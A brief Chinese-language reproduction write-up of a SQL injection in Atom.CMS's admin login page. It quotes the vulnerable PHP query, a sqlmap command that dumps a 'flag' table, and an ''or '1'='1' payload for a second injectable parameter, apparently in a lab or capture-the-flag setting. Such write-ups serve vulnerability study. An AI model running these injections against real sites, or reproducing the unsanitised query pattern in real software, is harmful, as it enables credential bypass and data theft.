## 1. 漏洞介绍
[阿里云漏洞库](https://avd.aliyun.com/detail?id=AVD-2022-24223)
## 2. 漏洞分析
[Sql Injection in /admin/login.php · Issue #255 · thedigicraft/Atom.CMS · GitHub](https://github.com/thedigicraft/Atom.CMS/issues/255)
注入点： /admin/login.php:

```php
<?php 
..... 
if($_POST)
  { 
  	 $q = "SELECT * FROM users WHERE email = '$_POST[email]' AND password = SHA1('$_POST[password]')"; 
  	 $r = mysqli_query($dbc, $q); 
.....
?>
```

## 3. 漏洞复现
登录页抓包 post 注入，示例如下

![1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309271631579.png)

```python
python sqlmap.py -r post.txt -p email -D atomcms -T flag -C flag --dump --batch
```

![2.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309271632290.png)

注，登录后的 `……admin/index.php?page=users&id=1`  id 参数也存在注入漏洞【`email=alan@alan.com'or '1'='1&password=123`】。